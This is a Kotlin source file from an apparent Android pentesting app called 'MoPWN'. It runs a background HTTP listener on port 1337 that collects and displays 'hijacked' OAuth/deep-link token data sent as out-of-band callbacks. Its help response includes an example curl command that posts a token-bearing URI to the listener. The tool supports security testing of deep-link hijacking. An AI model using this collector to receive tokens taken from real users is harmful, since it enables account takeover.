package com.mopwn.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.ServerSocket
import java.net.Socket
import java.net.NetworkInterface
import java.net.Inet4Address

class OobListenerService : Service() {

    private var serverSocket: ServerSocket? = null
    private var isRunningThread = false

    companion object {
        const val ACTION_NEW_OOB_LOG = "com.mopwn.app.ACTION_NEW_OOB_LOG"
        const val EXTRA_JSON_PAYLOAD = "com.mopwn.app.EXTRA_JSON_PAYLOAD"
        
        private const val CHANNEL_ID = "OobServerChannel"
        private const val NOTIFICATION_ID = 2002

        var isServiceRunning = false
            private set

        // Thread-safe log history buffer to keep logs across Activity lifecycles
        val inMemoryLogs = java.util.Collections.synchronizedList(ArrayList<String>())

        fun clearLogs() {
            inMemoryLogs.clear()
        }

        fun getLocalIpAddress(): String? {
            try {
                val interfaces = NetworkInterface.getNetworkInterfaces()
                while (interfaces.hasMoreElements()) {
                    val networkInterface = interfaces.nextElement()
                    val addresses = networkInterface.inetAddresses
                    while (addresses.hasMoreElements()) {
                        val inetAddress = addresses.nextElement()
                        if (!inetAddress.isLoopbackAddress && inetAddress is Inet4Address) {
                            return inetAddress.hostAddress
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            return null
        }
    }

    override fun onCreate() {
        super.onCreate()
        isServiceRunning = true
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        startServer()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isServiceRunning = false
        stopServer()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startServer() {
        isRunningThread = true
        Thread {
            try {
                serverSocket = ServerSocket(1337)
                while (isRunningThread) {
                    val socket = serverSocket?.accept() ?: break
                    handleClientSocket(socket)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun stopServer() {
        isRunningThread = false
        try {
            serverSocket?.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        serverSocket = null
    }

    private fun handleClientSocket(socket: Socket) {
        Thread {
            try {
                val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
                val out: OutputStream = socket.getOutputStream()

                var line = reader.readLine() ?: return@Thread
                val tokens = line.split(" ")
                if (tokens.size < 2) return@Thread
                val method = tokens[0]
                val path = tokens[1]

                var contentLength = 0
                while (true) {
                    line = reader.readLine() ?: break
                    if (line.isEmpty()) break
                    if (line.startsWith("Content-Length:", ignoreCase = true)) {
                        contentLength = line.substringAfter(":").trim().toIntOrNull() ?: 0
                    }
                }

                if (method == "POST" && path == "/" && contentLength > 0) {
                    val bodyChars = CharArray(contentLength)
                    var read = 0
                    while (read < contentLength) {
                        val chunk = reader.read(bodyChars, read, contentLength - read)
                        if (chunk == -1) break
                        read += chunk
                    }
                    val body = String(bodyChars)

                    // Store log in memory buffer
                    if (inMemoryLogs.size >= 100) {
                        inMemoryLogs.removeAt(0)
                    }
                    inMemoryLogs.add(body)

                    // Send broadcast with log payload
                    val broadcastIntent = Intent(ACTION_NEW_OOB_LOG).apply {
                        putExtra(EXTRA_JSON_PAYLOAD, body)
                        `package` = packageName
                    }
                    sendBroadcast(broadcastIntent)

                    // HTTP 200 Response
                    val response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"success\"}"
                    out.write(response.toByteArray())
                } else if (method == "GET" && path == "/") {
                    // Friendly developer guidance JSON payload
                    val responseBody = """
                        {
                          "message": "MoPWN OOB Hijack Listener Active",
                          "instructions": "Send an HTTP POST request containing your hijacked token data payload in JSON format.",
                          "expected_method": "POST",
                          "expected_payload_format": {
                            "device": "Device Model / Source (optional)",
                            "intercepted_uri": "Full deep link URL containing parameters/tokens (required)"
                          },
                          "example_curl": "curl -X POST -H 'Content-Type: application/json' -d '{\"device\":\"Test Client\",\"intercepted_uri\":\"https://example.com/oauth?token=secret_value\"}' http://${getLocalIpAddress() ?: "127.0.0.1"}:1337/"
                        }
                    """.trimIndent()
                    val response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$responseBody"
                    out.write(response.toByteArray())
                } else {
                    // HTTP 404 Response
                    val response = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n"
                    out.write(response.toByteArray())
                }
                out.flush()
                socket.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "MoPWN OOB Server Channel",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background service listening for OOB hijacked log callbacks"
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val ip = getLocalIpAddress() ?: "127.0.0.1"
        val text = "Server active: http://$ip:1337/"

        val intent = Intent(this, OobConsoleActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentTitle("MoPWN OOB Log Listener")
            .setContentText(text)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }
}
